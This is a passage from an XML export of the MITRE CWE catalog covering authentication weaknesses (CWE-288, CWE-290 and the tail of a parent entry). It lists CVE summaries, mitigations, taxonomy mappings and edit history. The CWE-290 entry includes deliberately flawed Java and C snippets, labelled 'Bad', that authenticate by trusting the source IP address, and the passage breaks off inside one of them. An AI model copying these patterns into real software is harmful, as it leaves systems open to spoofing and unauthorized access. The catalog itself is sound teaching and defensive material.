               <Description>Chain: Web UI for a Python RPC framework does not use regex anchors to validate user login emails (CWE-777), potentially allowing bypass of OAuth (CWE-1390).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30034</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29951</Reference>
               <Description>TCP-based protocol in Programmable Logic Controller (PLC) has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29951</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29952</Reference>
               <Description>Condition Monitor uses a protocol that does not require authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29952</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30313</Reference>
               <Description>Safety Instrumented System uses proprietary TCP protocols with no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30313</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30317</Reference>
               <Description>Distributed Control System (DCS) uses a protocol that has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30317</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-33139</Reference>
               <Description>SCADA system only uses client-side authentication, allowing adversaries to impersonate other users.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-33139</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-3116</Reference>
               <Description>Chain: Python-based HTTP Proxy server uses the wrong boolean operators (CWE-480) causing an  incorrect comparison (CWE-697) that identifies an authN failure if all three conditions are met instead of only one, allowing bypass of the proxy authentication (CWE-1390)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-3116</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21972</Reference>
               <Description>Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21972</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-37415</Reference>
               <Description>IT management product does not perform authentication for some REST API requests, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-37415</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-13927</Reference>
               <Description>Default setting in workflow management product allows all API requests without authentication, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-13927</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-35395</Reference>
               <Description>Stack-based buffer overflows in SFK for wifi chipset used for IoT/embedded devices, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-35395</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-34523</Reference>
               <Description>Mail server does not properly check an access token before executing a Powershell command, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-34523</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-12812</Reference>
               <Description>Chain: user is not prompted for a second authentication factor (CWE-287) when changing the case of their username (CWE-178), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-12812</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-10148</Reference>
               <Description>Authentication bypass by appending specific parameters and values to a URI, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-10148</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-0688</Reference>
               <Description>Mail server does not generate a unique key during installation, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-0688</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-14623</Reference>
               <Description>LDAP Go package allows authentication bypass using an empty password, causing an unauthenticated LDAP bind</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-14623</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3421</Reference>
               <Description>login script for guestbook allows bypassing authentication by setting a "login_ok" parameter to 1.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3421</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2382</Reference>
               <Description>admin script allows authentication bypass by setting a cookie value to "LOGGEDIN".</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2382</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1048</Reference>
               <Description>VOIP product allows authentication bypass using 127.0.0.1 in the Host header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1048</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>product uses default "Allow" action, instead of default deny, leading to authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2168</Reference>
               <Description>chain: redirect without exit (CWE-698) leads to resultant authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2168</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3107</Reference>
               <Description>product does not restrict access to a listening port for a critical service, allowing authentication to be bypassed.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3107</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1596</Reference>
               <Description>product does not properly implement a security-related configuration setting, allowing authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1596</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2422</Reference>
               <Description>authentication routine returns "nil" instead of "false" in some situations, allowing authentication bypass using an invalid username.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2422</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3232</Reference>
               <Description>authentication update script does not properly handle when admin does not select any authentication modules, allowing authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3232</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3231</Reference>
               <Description>use of LDAP authentication with anonymous binds causes empty password to result in successful authentication</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3231</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3435</Reference>
               <Description>product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3435</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0408</Reference>
               <Description>chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0408</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Authentication</Functional_Area>
         </Functional_Areas>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Authentication Error</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A7</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>1</Entry_ID>
               <Entry_Name>Insufficient Authentication</Entry_Name>
            </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 3-3</Entry_ID>
             <Entry_Name>Req SR 1.1</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 3-3</Entry_ID>
             <Entry_Name>Req SR 1.2</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 4-2</Entry_ID>
             <Entry_Name>Req CR 1.1</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 4-2</Entry_ID>
             <Entry_Name>Req CR 1.2</Entry_Name>
           </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="114"/>
            <Related_Attack_Pattern CAPEC_ID="115"/>
            <Related_Attack_Pattern CAPEC_ID="151"/>
            <Related_Attack_Pattern CAPEC_ID="194"/>
            <Related_Attack_Pattern CAPEC_ID="22"/>
            <Related_Attack_Pattern CAPEC_ID="57"/>
            <Related_Attack_Pattern CAPEC_ID="593"/>
            <Related_Attack_Pattern CAPEC_ID="633"/>
            <Related_Attack_Pattern CAPEC_ID="650"/>
            <Related_Attack_Pattern CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-236"/>
            <Reference External_Reference_ID="REF-237"/>
            <Reference External_Reference_ID="REF-238"/>
            <Reference External_Reference_ID="REF-239"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authentication&#34; Page 109"/>
            <Reference External_Reference_ID="REF-1283"/>
         </References>
         <Notes>
            <Note Type="Relationship">This can be resultant from SQL injection vulnerabilities and other issues.</Note>
			<Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Common_Consequences, Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Observed_Examples, Taxonomy_Mappings</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Authentication Issues</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Insufficient Authentication</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="288" Name="Authentication Bypass Using an Alternate Path or Channel" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>A product requires authentication, but the product has an alternate path or channel that does not require authentication.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="306" View_ID="1000" Ordinal="Primary"/>
	    <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="420" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This is often seen in web applications that assume that access to a particular CGI program can only be obtained through a "front" screen, when the supporting programs are directly accessible. But this problem is not just in web apps.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Funnel all access through a single choke point to simplify how users can access a resource. For every access, perform a check to determine if the user has permissions to access the resource.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2000-1179</Reference>
               <Description>Router allows remote attackers to read system logs without authentication by directly connecting to the login screen and typing certain control characters.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-1179</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1454</Reference>
               <Description>Attackers with physical access to the machine may bypass the password prompt by pressing the ESC (Escape) key.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1454</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1077</Reference>
               <Description>OS allows local attackers to bypass the password protection of idled sessions via the programmer's switch or CMD-PWR keyboard sequence, which brings up a debugger that the attacker can use to disable the lock.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1077</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0304</Reference>
               <Description>Direct request of installation file allows attacker to create administrator accounts.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0304</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0870</Reference>
               <Description>Attackers may gain additional privileges by directly requesting the web management URL.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0870</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0066</Reference>
               <Description>Bypass authentication via direct request to named pipe.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0066</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1035</Reference>
               <Description>User can avoid lockouts by using an API instead of the GUI to conduct brute force password guessing.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1035</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Authentication Bypass by Alternate Path/Channel</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Failure to Restrict URL Access</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="127"/>
            <Related_Attack_Pattern CAPEC_ID="665"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">overlaps Unprotected Alternate Channel</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Modes_of_Introduction, Name, Relationships, Observed_Example, Relationship_Notes, Taxonomy_Mappings, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-09-09">Authentication Bypass by Alternate Path/Channel</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="290" Name="Authentication Bypass by Spoofing" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>This attack-focused weakness is caused by incorrectly implemented authentication schemes that are subject to spoofing attacks.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1390" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>This weakness can allow an attacker to access resources which are not otherwise accessible without proper authentication.</Note>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code authenticates users.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String sourceIP = request.getRemoteAddr();<xhtml:br/>if (sourceIP != null &amp;&amp; sourceIP.equals(APPROVED_IP)) {<xhtml:div style="margin-left:1em;">authenticated = true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The authentication mechanism implemented relies on an IP address for source validation. If an attacker is able to spoof the IP, they may be able to bypass the authentication mechanism.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-99">
               <Intro_Text>Both of these examples check if a request is from a trusted address before responding to the request.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>sd = socket(AF_INET, SOCK_DGRAM, 0);<xhtml:br/>serv.sin_family = AF_INET;<xhtml:br/>serv.sin_addr.s_addr = htonl(INADDR_ANY);<xhtml:br/>servr.sin_port = htons(1008);<xhtml:br/>bind(sd, (struct sockaddr *) &amp; serv, sizeof(serv));<xhtml:br/>
                     <xhtml:br/>while (1) {<xhtml:div style="margin-left:1em;">memset(msg, 0x0, MAX_MSG);<xhtml:br/>clilen = sizeof(cli);<xhtml:br/>if (inet_ntoa(cli.sin_addr)==getTrustedAddress()) {<xhtml:div style="margin-left:1em;">n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) &amp; cli, &amp;clilen);</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>while(true) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>DatagramPacket rp=new DatagramPacket(rData,rData.length);<xhtml:br/>outSock.receive(rp);<xhtml:br/>String in = new String(p.getData(),0, rp.getLength());<xhtml:br/>InetAddress clientIPAddress = rp.getAddress();<xhtml:br/>int port = rp.getPort();<xhtml:br/>
